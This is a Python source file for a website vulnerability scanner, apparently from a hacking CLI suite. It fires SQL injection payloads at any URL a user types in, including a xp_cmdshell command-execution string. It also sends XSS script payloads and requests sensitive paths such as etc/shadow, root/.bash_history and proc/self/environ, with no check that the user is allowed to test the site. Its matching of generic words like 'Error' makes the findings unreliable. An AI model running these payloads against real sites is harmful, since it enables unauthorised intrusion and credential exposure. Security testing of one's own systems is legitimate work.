import requests
import time
import sys
import threading

# ANSI color codes for terminal output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
WHITE = "\033[97m"

def current_time_hour():
    return time.strftime("%H:%M:%S")

# Spinner implementation
class Spinner:
    def __init__(self, message="Scanning..."):
        self.spinner = ['|', '/', '-', '\\']
        self.idx = 0
        self.running = False
        self.thread = None
        self.message = message

    def spin(self):
        while self.running:
            sys.stdout.write(f"\r{self.message} {self.spinner[self.idx % len(self.spinner)]}")
            sys.stdout.flush()
            self.idx += 1
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * (len(self.message) + 4) + '\r')  # Clear line

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self.spin)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()

def scan_sql_injection(url, report):
    payloads = [
        "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
        "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
        "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
        "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
        "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
        "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
        "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
    ]
    indicators = [
        "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
        "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
        "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
        "You have an error in your SQL syntax", "Incorrect syntax near", 
        "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    found = []
    for payload in payloads:
        try:
            resp = requests.get(url, params={"id": payload}, timeout=4, headers=headers)
            for indicator in indicators:
                if indicator.lower() in resp.text.lower():
                    found.append(f"Payload: {payload} | Indicator: {indicator}")
        except Exception:
            continue
    report['sql'] = found

def scan_xss(url, report):
    payloads = [
        "<script>alert('XssFoundByRedTiger')</script>",
        "<img src=x onerror=alert('XssFoundByRedTiger')>",
        "<svg/onload=alert('XssFoundByRedTiger')>"
    ]
    indicators = ["<script>", "alert(", "onerror=", "<svg", "javascript:"]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    found = []
    for payload in payloads:
        try:
            resp = requests.get(url, params={"q": payload}, timeout=4, headers=headers)
            for indicator in indicators:
                if indicator in resp.text:
                    found.append(f"Payload: {payload} | Indicator: {indicator}")
        except Exception:
            continue
    report['xss'] = found

def scan_interesting_paths(url, report):
    paths = [
        "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
        "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
        "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
        "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
        "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
        "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
        "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
        "server-status", "server-status/", "server-status/index.html",
        "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    found = []
    for path in paths:
        try:
            full_url = url.rstrip("/") + "/" + path
            resp = requests.get(full_url, timeout=4, headers=headers)
            if resp.status_code == 200:
                found.append(path)
        except Exception:
            continue
    report['paths'] = found

def scan_sensitive_files(url, report):
    files = [
        "etc/passwd", "etc/password", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname",
        "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/nginx/access.log",
        "root/.bash_history", "home/user/.bash_history", "www/html/wp-config.php", "proc/self/environ",
        "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/menu.lst", "proc/net/tcp"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    found = []
    for file in files:
        try:
            full_url = url.rstrip("/") + "/" + file
            resp = requests.get(full_url, timeout=4, headers=headers)
            if resp.status_code == 200 and len(resp.text) > 10:
                found.append(file)
        except Exception:
            continue
    report['files'] = found

def website_vulnerability_scan_cli_with_url(url, return_results=False):
    print(f"{CYAN}Website Vulnerability Scanner{RESET}")
    if not url.startswith("http"):
        url = "https://" + url
    print(f"{CYAN}[{current_time_hour()}]{RESET} {YELLOW}Initiating scan. Please wait...{RESET}")

    report = {}

    spinner = Spinner("Scanning website for vulnerabilities")
    spinner.start()

    try:
        scan_sql_injection(url, report)
        scan_xss(url, report)
        scan_interesting_paths(url, report)
        scan_sensitive_files(url, report)
    except KeyboardInterrupt:
        spinner.stop()
        print(f"{RED}\nScan interrupted by user.{RESET}")
        return

    spinner.stop()

    print(f"{CYAN}[{current_time_hour()}]{RESET} {GREEN}Scan complete.{RESET}\n")

    print(f"{CYAN}--- Vulnerability Scan Results for {url} ---{RESET}")
    print(f"{YELLOW}SQL Injection vulnerabilities found:{RESET}")
    if report['sql']:
        for item in report['sql']:
            print(f"  {GREEN}{item}{RESET}")
    else:
        print(f"  {RED}None{RESET}")

    print(f"{YELLOW}Cross-site scripting (XSS) vulnerabilities found:{RESET}")
    if report['xss']:
        for item in report['xss']:
            print(f"  {GREEN}{item}{RESET}")
    else:
        print(f"  {RED}None{RESET}")

    print(f"{YELLOW}Interesting paths found:{RESET}")
    if report['paths']:
        for item in report['paths']:
            print(f"  {GREEN}{item}{RESET}")
    else:
        print(f"  {RED}None{RESET}")

    print(f"{YELLOW}Sensitive files found:{RESET}")
    if report['files']:
        for item in report['files']:
            print(f"  {GREEN}{item}{RESET}")
    else:
        print(f"  {RED}None{RESET}")

    print(f"{CYAN}Scan finished. Returning to Sentient CLI...{RESET}")

    if return_results:
        return report

# For standalone usage
def website_vulnerability_scan_cli():
    url = input(f"{YELLOW}Enter website URL (with http/https): {RESET}").strip()
    website_vulnerability_scan_cli_with_url(url)

if __name__ == "__main__":
    website_vulnerability_scan_cli()